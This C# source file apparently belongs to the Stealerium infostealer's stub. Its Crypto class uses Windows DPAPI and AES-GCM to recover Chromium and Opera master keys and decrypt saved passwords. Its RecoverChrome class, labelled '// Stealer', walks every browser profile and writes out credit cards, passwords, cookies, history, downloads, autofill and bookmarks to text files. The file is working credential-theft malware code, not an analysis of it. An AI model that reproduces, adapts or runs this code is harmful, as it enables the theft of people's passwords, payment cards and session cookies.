using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.Browsers.Chromium
{
    internal sealed class Crypto
    {
        // Speed up decryption using master key
        private static string _sPrevBrowserPath = "";
        private static byte[] _sPrevMasterKey = { };

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription,
            ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags,
            ref DataBlob pPlainText);

        // Chrome < 80
        public static byte[] DpapiDecrypt(byte[] bCipher, byte[] bEntropy = null)
        {
            var pPlainText = new DataBlob();
            var pCipherText = new DataBlob();
            var pEntropy = new DataBlob();

            var pPrompt = new CryptprotectPromptstruct
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };

            var sEmpty = string.Empty;

            try
            {
                try
                {
                    if (bCipher == null)
                        bCipher = Array.Empty<byte>();

                    pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
                    pCipherText.cbData = bCipher.Length;
                    Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);
                }
                catch
                {
                    // ignored
                }

                try
                {
                    if (bEntropy == null)
                        bEntropy = Array.Empty<byte>();

                    pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
                    pEntropy.cbData = bEntropy.Length;

                    Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);
                }
                catch
                {
                    // ignored
                }

                CryptUnprotectData(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1,
                    ref pPlainText);

                var bDestination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
                return bDestination;
            }
            catch
            {
                // ignored
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);

                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);

                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }

            return Array.Empty<byte>();
        }

        // Chrome > 80
        public static byte[] GetMasterKey(string sLocalStateFolder)
        {
            var sLocalStateFile = sLocalStateFolder;
            byte[] bMasterKey = { };

            if (sLocalStateFile.Contains("Opera"))
            {
                var possiblePaths = new[]
                {
                    Path.Combine(sLocalStateFile, "Opera Stable", "Local State"),
                    Path.Combine(sLocalStateFile, "Opera GX Stable", "Local State"),
                    Path.Combine(sLocalStateFile, "Opera", "Local State"),
                    Path.Combine(sLocalStateFile, "Local State")  // Direct path for some Opera installations
                };

                var foundPath = false;
                foreach (var path in possiblePaths)
                {
                    if (File.Exists(path))
                    {
                        sLocalStateFile = path;
                        foundPath = true;
                        Logging.Log($"Found Opera Local State at: {path}");
                        break;
                    }
                }

                if (!foundPath)
                {
                    Logging.Log($"Could not find Opera Local State in any expected location. Base path: {sLocalStateFolder}");
                    return null;
                }
            }
            else
                sLocalStateFile = Path.Combine(sLocalStateFile, "Local State");

            if (!File.Exists(sLocalStateFile))
            {
                Logging.Log($"Local State file not found at: {sLocalStateFile}");
                return null;
            }

            // Cache check for performance
            if (sLocalStateFile == _sPrevBrowserPath)
                return _sPrevMasterKey;
            
            _sPrevBrowserPath = sLocalStateFile;

            try
            {
                var localState = File.ReadAllText(sLocalStateFile);
                var pattern = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled);
                var match = pattern.Match(localState);
                
                if (match.Success)
                {
                    bMasterKey = Convert.FromBase64String(match.Groups[1].Value);
                    var bRawMasterKey = new byte[bMasterKey.Length - 5];
                    Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);

                    _sPrevMasterKey = DpapiDecrypt(bRawMasterKey);
                    if (_sPrevMasterKey == null || _sPrevMasterKey.Length == 0)
                    {
                        Logging.Log("Failed to decrypt master key with DPAPI");
                        return null;
                    }
                    return _sPrevMasterKey;
                }
                else
                {
                    Logging.Log("Could not find encrypted_key in Local State file");
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Failed to get master key: " + ex);
            }

            return null;
        }

        public static string GetUtf8(string sNonUtf8)
        {
            try
            {
                var bData = Encoding.Default.GetBytes(sNonUtf8);
                return Encoding.UTF8.GetString(bData);
            }
            catch
            {
                return sNonUtf8;
            }
        }


        public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
        {
            if (bEncryptedData == null || bMasterKey == null || bEncryptedData.Length < 15)
                return null;

            try
            {
                byte[] bIv = new byte[12];
                Array.Copy(bEncryptedData, 3, bIv, 0, 12);

                var bBuffer = new byte[bEncryptedData.Length - 15];
                Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);

                if (bBuffer.Length <= 16)  // Need at least 16 bytes for the tag
                    return null;

                var bTag = new byte[16];
                var bData = new byte[bBuffer.Length - 16];

                Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
                Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - 16);

                var aDecryptor = new CAesGcm();
                return aDecryptor.Decrypt(bMasterKey, bIv, null, bData, bTag);
            }
            catch (Exception ex)
            {
                Logging.Log("Failed to decrypt with key: " + ex);
                return null;
            }
        }

        public static string EasyDecrypt(string sLoginData, string sPassword)
        {
            if (string.IsNullOrEmpty(sPassword))
                return string.Empty;

            try
            {
                if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
                {
                    var parentPath = Directory.GetParent(sLoginData)?.Parent?.FullName;
                    if (string.IsNullOrEmpty(parentPath))
                        return string.Empty;

                    var bMasterKey = GetMasterKey(parentPath);
                    if (bMasterKey == null || bMasterKey.Length == 0)
                        return string.Empty;

                    var decrypted = DecryptWithKey(Encoding.Default.GetBytes(sPassword), bMasterKey);
                    if (decrypted == null)
                        return string.Empty;

                    return Encoding.Default.GetString(decrypted);
                }

                var dpapi = DpapiDecrypt(Encoding.Default.GetBytes(sPassword));
                return dpapi != null ? Encoding.Default.GetString(dpapi) : string.Empty;
            }
            catch (Exception ex)
            {
                Logging.Log("Failed to decrypt password: " + ex);
                return string.Empty;
            }
        }

        public static string BrowserPathToAppName(string sLoginData)
        {
            if (sLoginData.Contains("Opera")) return "Opera";
            var replace = sLoginData.Replace(Paths.Lappdata, "");
            return replace.Split('\\')[1];
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
    }

    // Stealer
    internal sealed class RecoverChrome
    {
        public static void Run(string sSavePath)
        {
            if (!Directory.Exists(sSavePath))
                Directory.CreateDirectory(sSavePath);

            foreach (var sPath in Paths.SChromiumPswPaths)
            {
                string sFullPath;
                if (sPath.Contains("Opera Software"))
                    sFullPath = Paths.Appdata + sPath;
                else
                    sFullPath = Paths.Lappdata + sPath;

                if (Directory.Exists(sFullPath))
                    foreach (var sProfile in Directory.GetDirectories(sFullPath))
                    {
                        // Write chromium passwords, credit cards, cookies
                        var sBDir = sSavePath + "\\" + Crypto.BrowserPathToAppName(sPath);
                        Directory.CreateDirectory(sBDir);
                        // Run tasks
                        var pCreditCards = CreditCards.Get(sProfile + "\\Web Data");
                        var pPasswords = Passwords.Get(sProfile + "\\Login Data");
                        var pCookies = Cookies.Get(sProfile + "\\Cookies");
                        var pHistory = History.Get(sProfile + "\\History");
                        var pDownloads = Downloads.Get(sProfile + "\\History");
                        var pAutoFill = Autofill.Get(sProfile + "\\Web Data");
                        var pBookmarks = Bookmarks.Get(sProfile + "\\Bookmarks");
                        // Await values and write
                        CBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
                        CBrowserUtils.WritePasswordsToTxt(pPasswords, sBDir + "\\Passwords.txt");
                        CBrowserUtils.WritePasswordsToCsv(pPasswords, sBDir + "\\Passwords.csv");
                        // Create a README.txt file in the directory
                        CBrowserUtils.CreateReadme(sBDir, pPasswords);
                        CBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
                        CBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
                        CBrowserUtils.WriteHistory(pDownloads, sBDir + "\\Downloads.txt");
                        CBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
                        CBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
                    }
            }
        }
    }
}